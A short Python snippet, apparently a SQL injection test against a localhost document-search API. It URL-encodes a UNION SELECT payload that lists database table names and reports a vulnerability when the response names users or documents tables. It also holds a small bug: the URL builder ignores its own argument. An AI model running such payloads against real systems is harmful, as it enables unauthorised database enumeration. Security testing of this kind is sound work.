sql_query = ' UNION SELECT TABLE_NAME, NULL, NULL FROM INFORMATION_SCHEMA.TABLES--' 

import urllib.parse

def encode_query(sql_query):
  encoded_query = urllib.parse.quote(sql_query)
  return encoded_query

def build_search_url(query=None):
  base_url = "http://localhost:8080/api/documents/search"
  if query is not None: 
    encoded_query = encode_query(sql_query)
    return f"{base_url}?query={encoded_query}"


import json

def analyze_response(response):
  try:
    data = json.loads(response)
    if 'USERS' in data or 'DOCUMENTS' in data:
      print('Vulnerabilidade de Injeção SQL detetada no parâmetro de busca')
    else: 
      print("Nenhuma vulnerabilidade detectada")

  except json.JSONDecodeError:
    print("Resposta inválida.")

# ... (código para solicitar a resposta) 

